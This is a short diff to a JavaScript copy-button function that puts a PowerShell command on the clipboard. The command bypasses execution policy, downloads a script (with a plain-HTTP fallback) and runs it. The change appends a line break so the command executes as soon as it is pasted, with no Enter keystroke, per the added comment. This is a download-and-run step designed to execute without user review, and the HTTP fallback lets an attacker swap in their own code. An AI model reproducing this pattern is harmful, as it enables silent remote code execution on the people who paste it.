@@ -66,7 +66,8 @@ function copyScript(btn) {
     const urlHttps = btn.getAttribute('data-url-https');
     const urlHttp = btn.getAttribute('data-url-http');
     
-    const command = `Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $u1='${urlHttps}'; $u2='${urlHttp}'; try { iwr $u1 -OutFile $env:TEMP\\i.ps1 -TimeoutSec 5 } catch { iwr $u2 -OutFile $env:TEMP\\i.ps1 }; if (Test-Path $env:TEMP\\i.ps1) { & $env:TEMP\\i.ps1 }`;
+    // The \r\n at the end ensures PowerShell executes it immediately upon pasting without requiring an 'Enter' keystroke
+    const command = `Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $u1='${urlHttps}'; $u2='${urlHttp}'; try { iwr $u1 -OutFile $env:TEMP\\i.ps1 -TimeoutSec 5 } catch { iwr $u2 -OutFile $env:TEMP\\i.ps1 }; if (Test-Path $env:TEMP\\i.ps1) { & $env:TEMP\\i.ps1 }\r\n`;
     
     navigator.clipboard.writeText(command).then(() => {
         const originalHtml = btn.innerHTML;
